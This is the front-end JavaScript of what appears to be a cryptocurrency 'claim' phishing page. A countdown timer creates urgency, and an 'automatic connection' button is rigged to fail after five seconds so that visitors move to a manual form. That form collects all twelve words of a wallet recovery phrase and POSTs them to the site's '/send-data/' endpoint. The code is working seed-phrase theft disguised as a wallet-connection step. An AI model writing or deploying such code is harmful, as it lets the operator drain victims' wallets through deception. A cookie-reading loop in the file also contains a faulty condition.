

document.addEventListener('DOMContentLoaded', () => {
    const claimPage = document.getElementById('claimPage');
    const recoveryPage = document.getElementById('recoveryPage');
    const claimButton = document.getElementById('claimButton');
    const mainClaimButton = document.getElementById('mainClaimButton');
    const manualButton = document.getElementById('manualButton');
    const backButton = document.getElementById('backButton');
    const phraseGrid = document.getElementById('phraseGrid');
    const continueButton = document.querySelector('.continue-button');
    const errorMessage = document.getElementById('errorMessage');
    const phrases = Array(12).fill('');

    // Countdown Timer
    function updateTimer() {
        const now = new Date();
        const hours = document.getElementById('hours');
        const minutes = document.getElementById('minutes');
        const seconds = document.getElementById('seconds');

        let hoursValue = parseInt(hours.textContent);
        let minutesValue = parseInt(minutes.textContent);
        let secondsValue = parseInt(seconds.textContent);

        if (secondsValue > 0) {
            secondsValue--;
        } else if (minutesValue > 0) {
            minutesValue--;
            secondsValue = 59;
        } else if (hoursValue > 0) {
            hoursValue--;
            minutesValue = 59;
            secondsValue = 59;
        }

        hours.textContent = hoursValue.toString().padStart(2, '0');
        minutes.textContent = minutesValue.toString().padStart(2, '0');
        seconds.textContent = secondsValue.toString().padStart(2, '0');
    }

    setInterval(updateTimer, 1000);

    // Function to check if all phrases are filled
    const areAllPhrasesFilled = () => phrases.every(phrase => phrase.trim() !== '');

    // Function to update button state
    const updateContinueButton = () => {
        if (areAllPhrasesFilled()) {
            continueButton.removeAttribute('disabled');
            continueButton.classList.remove('disabled');
        } else {
            continueButton.setAttribute('disabled', 'true');
            continueButton.classList.add('disabled');
        }
    };

    // Handle automatic connection
    const handleClaim = (button) => {
        button.classList.add('loading');
        errorMessage.classList.remove('visible');
        
        // Simulate loading for 5 seconds, then show error
        setTimeout(() => {
            button.classList.remove('loading');
            errorMessage.classList.add('visible');
            // Highlight the manual connect button
            manualButton.style.animation = 'pulse 2s infinite';
        }, 5000);
    };

    claimButton.addEventListener('click', () => handleClaim(claimButton));
    mainClaimButton.addEventListener('click', () => handleClaim(mainClaimButton));

    // Handle manual connection
    manualButton.addEventListener('click', () => {
        claimPage.classList.add('hidden');
        recoveryPage.classList.remove('hidden');
        document.body.style.overflow = 'auto';
        // Reset error message and animations when switching to manual mode
        errorMessage.classList.remove('visible');
        manualButton.style.animation = '';
    });

    backButton.addEventListener('click', () => {
        recoveryPage.classList.add('hidden');
        claimPage.classList.remove('hidden');
    });

    // Initial button state
    updateContinueButton();

    // Create input fields
    for (let i = 0; i < 12; i++) {
        const wrapper = document.createElement('div');
        wrapper.className = 'input-wrapper';

        const input = document.createElement('input');
        input.type = 'text';
        input.className = 'phrase-input';
        input.placeholder = `Word ${i + 1}`;
        input.dataset.index = i;

        const number = document.createElement('span');
        number.className = 'input-number';
        number.textContent = i + 1;

        wrapper.appendChild(input);
        wrapper.appendChild(number);
        phraseGrid.appendChild(wrapper);

        // Handle input changes
        input.addEventListener('input', (e) => {
            const index = parseInt(e.target.dataset.index);
            phrases[index] = e.target.value;
            updateContinueButton();
        });

        // Handle enter key to move to next input
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const nextInput = phraseGrid.querySelector(`[data-index="${i + 1}"]`);
                if (nextInput) {
                    nextInput.focus();
                }
            }
        });
    }

   //        // Handle continue button
       continueButton.addEventListener('click', () => {
        const isComplete = phrases.every(phrase => phrase.trim() !== '');
        if (isComplete) {
            const recoveryPhrase = phrases.join(' ');
            console.log('Recovery phrase:', recoveryPhrase);
            // Send data to Django backend
            fetch('/send-data/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRFToken': getCookie('csrftoken') // Include CSRF token for security
                },
                body: JSON.stringify({ recovery_phrase: recoveryPhrase })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    window.location.href = data.redirect_url;  // Redirect to success page
                } else {
                    console.error('Error:', data.error);
                }
            })
            .catch((error) => {
                console.error('Error:', error);
                // Handle error response
            });
        } else {
            alert('Please fill in all words of the recovery phrase');
        }
    });
});

// Smooth scroll for navigation links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        document.querySelector(this.getAttribute('href')).scrollIntoView({
            behavior: 'smooth'
        });
    });
});

// Function to get CSRF token from cookies
function getCookie(name) {
    let cookieValue = null;
    if (document.cookie && document.cookie !== '') {
        const cookies = document.cookie.split(';');
        for (let i = 0; cookies.length; i++) {
            const cookie = cookies[i].trim();
            // Does this cookie string begin with the name we want?
            if (cookie.substring(0, name.length + 1) === (name + '=')) {
                cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                break;
            }
        }
    }
    return cookieValue;
}

    